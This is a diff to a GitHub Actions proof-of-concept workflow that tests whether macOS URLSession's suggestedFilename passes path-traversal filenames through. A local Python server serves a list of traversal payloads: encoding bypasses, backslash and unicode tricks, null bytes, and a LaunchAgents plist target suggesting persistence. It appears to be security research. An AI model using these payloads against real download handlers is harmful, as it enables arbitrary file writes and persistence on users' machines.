@@ -1,21 +1,40 @@
-name: PoC Real Server
+name: PoC Multi-OS
 on: workflow_dispatch
 jobs:
   test:
-    runs-on: macos-latest
+    strategy:
+      matrix:
+        os: [macos-13, macos-14, macos-15]
+    runs-on: ${{ matrix.os }}
     steps:
-      - name: Test suggestedFilename with real HTTP server
+      - name: Show OS version
+        run: sw_vers
+
+      - name: Test suggestedFilename
         run: |
           cat > server.py << 'PYEOF'
           from http.server import BaseHTTPRequestHandler, HTTPServer
           import threading
 
           PAYLOADS = [
-              ("../../../../../../tmp/pwned.txt", b"pwned-content"),
-              ("../escape.bin", b"escape-content"),
-              ("normal.zip", b"normal-content"),
-              ("../../LaunchAgents/evil.plist", b"evil-content"),
-              ('../"quoted".bin', b"quoted-content"),
+              # Basic traversal
+              ("../../../../../../tmp/pwned.txt", b"1"),
+              ("../escape.bin", b"2"),
+              ("normal.zip", b"3"),
+              ("../../LaunchAgents/evil.plist", b"4"),
+              # Encoding bypasses
+              ("..%2F..%2Ftmp%2Fpwned.txt", b"5"),
+              ("..%252F..%252Ftmp%252Fpwned.txt", b"6"),
+              ("..\\..\\tmp\\pwned.txt", b"7"),
+              ("..\\/tmp/pwned.txt", b"8"),
+              ("..%5C..%5Ctmp%5Cpwned.txt", b"9"),
+              # Unicode tricks
+              ("\u2025/tmp/pwned.txt", b"10"),
+              ("..%00/tmp/pwned.txt", b"11"),
+              (".\u002e/tmp/pwned.txt", b"12"),
+              # Long traversal
+              ("....//....//tmp//pwned.txt", b"13"),
+              (".%2e/%2e./tmp/pwned.txt", b"14"),
           ]
 
           current = 0
@@ -56,7 +75,16 @@ jobs:
               "../escape.bin",
               "normal.zip",
               "../../LaunchAgents/evil.plist",
-              "../\"quoted\".bin"
+              "..%2F..%2Ftmp%2Fpwned.txt",
+              "..%252F..%252Ftmp%252Fpwned.txt",
+              "..\\\\..\\\\tmp\\\\pwned.txt",
+              "..\\\\/tmp/pwned.txt",
+              "..%5C..%5Ctmp%5Cpwned.txt",
+              "unicode-twodotleader/tmp/pwned.txt",
+              "..%00/tmp/pwned.txt",
+              "dot-escape/tmp/pwned.txt",
+              "....//....//tmp//pwned.txt",
+              ".%2e/%2e./tmp/pwned.txt",
           ]
 
           class Delegate: NSObject, URLSessionDownloadDelegate {
@@ -70,25 +98,32 @@ jobs:
                               didFinishDownloadingTo location: URL) {
                   let resp = downloadTask.response!
                   let name = resp.suggestedFilename ?? "nil"
-                  let safe = (name as NSString).lastPathComponent
 
-                  let baseDir = "/Users/test/Library/Caches/com.example/PersistentDownloads/UUID/App 1.0"
+                  let baseDir = "/Users/test/Library/Caches/com.example/PersistentDownloads/UUID/App"
                   let joined = (baseDir as NSString).appendingPathComponent(name)
 
-                  print("[\(self.index)] input: \(self.input)")
-                  print("  suggestedFilename: \(name)")
-                  print("  lastPathComponent: \(safe)")
-                  print("  appendPathComponent: \(joined)")
-                  print("  HAS_DOTDOT: \(name.contains(".."))")
-                  print("  HAS_SLASH: \(name.contains("/"))")
-                  print("  TRAVERSES: \(joined.contains(".."))")
+                  let hasSlash = name.contains("/")
+                  let hasDotDot = name.contains("..")
+                  let traverses = joined.range(of: "..") != nil
+
+                  // Flag anything interesting
+                  let flag = (hasSlash || traverses) ? " <<<< INTERESTING" : ""
+
+                  print("[\(self.index)] \(self.input)")
+                  print("  -> \(name)")
+                  print("  -> \(joined)")
+                  print("  slash=\(hasSlash) dotdot=\(hasDotDot) traverses=\(traverses)\(flag)")
                   print()
                   semaphore.signal()
               }
               func urlSession(_ s: URLSession, task: URLSessionTask,
                               didCompleteWithError error: Error?) {
-                  if let e = error { print("  ERROR: \(e)"); semaphore.signal() }
+                  if let e = error {
+                      print("[\(self.index)] ERROR: \(e)")
+                      semaphore.signal()
+                  }
               }
+              private var index_: Int { return index }
           }
 
           for (i, p) in payloads.enumerated() {
